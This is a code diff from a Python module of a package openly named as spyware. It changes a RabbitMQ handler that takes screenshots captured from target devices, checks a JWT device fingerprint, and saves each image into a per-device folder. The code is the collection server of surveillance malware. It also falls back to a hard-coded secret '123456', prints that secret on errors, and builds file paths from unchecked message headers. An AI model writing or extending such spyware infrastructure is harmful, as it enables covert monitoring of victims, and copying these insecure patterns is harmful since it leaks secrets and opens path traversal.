@@ -3,55 +3,42 @@ import jwt
 from spyware_server_common.utils import createFolderIfNotExists, generate_random
 from spyware_server_common.config import get_config
 
-def create_screenshot_loader (fp) :
-    def screenshot_loader (ch, method, properties, body) :
-        dirname = os.path.join(os.path.join('screenshots/', fp))
-        filename = os.path.join(dirname, f'{generate_random(20)}.bmp')
-
-        with open(filename, 'ab') as f :
-            f.write(body)
-        
-        ch.basic_ack(delivery_tag=method.delivery_tag)
-
-    return screenshot_loader
-
-def create_screenshots_callback (rmqConnection) :
+def create_screenshots_callback () :
     def screenshots_callback (ch, method, properties, body) :
-        data = None
-        config = get_config()
-
         ch.basic_ack(delivery_tag=method.delivery_tag)
 
+        config = get_config()
+        headers = properties.headers
+
+        if headers is None : return
+        
+        if 'token' not in headers or 'screenId' not in headers : return
+
+        token = headers.get('token')
+        screenId = headers.get('screenId')
+        extension = headers.get('ext', 'bmp')
+
         try :
-            data = json.loads(body)
-        except :
-            return
-
-        if 'token' not in data or 'queue' not in data :
-            return
-
-        queue = data.get('queue')
-        token = data.get('token')
-
-        try :
-            tokenData = jwt.decode(token.encode(), config.get('secrect', '123456'), algorithms=["HS256"])
+            tokenData = jwt.decode(token.encode(), config.get('secret', '123456'), algorithms=["HS256"])
         except Exception as ex:
+            print('[ERROR]', ex.__str__())
+            print(config.get('secrect', '123456'))
             return
 
+        print('token =>', tokenData)
         if tokenData is None : return
 
         fp = tokenData.get('fp')
 
-        if fp is None : True
+        if fp is None : return
 
+        dirname = os.path.join('screenshots/', fp)
         createFolderIfNotExists('screenshots')
-        createFolderIfNotExists(os.path.join('screenshots/', fp))
-        newChannel = rmqConnection.channel()
+        createFolderIfNotExists(dirname)
 
-        try :
-            newChannel.basic_consume(queue, create_screenshot_loader(fp))
-            newChannel.start_consuming()
-        except Exception as ex :
-            print("[ERROR] " +  ex.__str__())   
+        print('dirname =>', dirname)
+
+        with open(os.path.join(dirname, f'{screenId}.{extension}'), 'ab') as f:
+            f.write(body)
 
     return screenshots_callback
